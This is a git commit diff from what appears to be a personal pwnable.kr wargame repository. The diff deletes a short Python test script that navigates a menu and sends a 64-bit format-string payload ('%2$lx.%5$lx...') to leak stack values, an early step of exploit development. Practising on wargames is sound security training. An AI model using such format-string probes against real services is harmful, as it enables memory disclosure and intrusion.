30c02d030eac9dff869cf88b2187ea4b80a917bf
MrB4N4N4 <2016rudgns@naver.com>
2021-08-19 01:08:32 -0400

    Directory changed

--- pwnable-kr/test.py
+++ pwnable-kr/test.py
@@ -8,18 +8,3 @@ Apply it remote environment!!
 First I need to test FSB-64bit using "%1$lx"
 """
 
-
-def select_menu(num):
-    print(r.recvuntil(b"> "))
-    r.sendline(num.encode())
-
-
-fsb = ("%{}$lx.%{}$lx.%{}$lx.%{}$lx.%{}$lx.".format(2, 5, 10, 11, 12)).encode()
-
-
-r.sendline(b"AAAA")
-
-select_menu("2")
-print(r.recvline())
-r.sendline(fsb)
-print(r.recv())
